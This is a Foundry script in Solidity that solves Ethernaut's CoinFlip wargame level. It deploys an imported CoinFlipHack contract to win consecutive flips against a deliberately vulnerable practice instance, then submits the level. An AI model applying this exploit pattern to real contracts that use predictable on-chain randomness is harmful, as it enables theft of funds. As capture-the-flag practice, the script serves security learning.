// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {console} from "lib/forge-std/src/Script.sol";
import {EthernautScript} from "./Ethernaut.s.sol";
import {CoinFlipHack} from "../src/3_Coinflip/CoinflipHack.sol";

interface Instance {
    function owner() external view returns (address);
    function consecutiveWins() external view returns(uint256);
}

contract LevelScript is EthernautScript {
    address level = 0x9240670dbd6476e6a32055E52A0b0756abd26fd2;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.startBroadcast(key);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
        console.log("instance consecutive wins:", instance.consecutiveWins());
    }

    function hack() internal {
        CoinFlipHack coinflipHack = new CoinFlipHack(address(instance));
        // coinflipHack.SolidityBuild();
        coinflipHack.YulBuild();
        console.log("Hack instance consecutive wins:", instance.consecutiveWins());
    }

    function run() public {
        hack();
        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
// forge script ./script/3_Coinflip.s.sol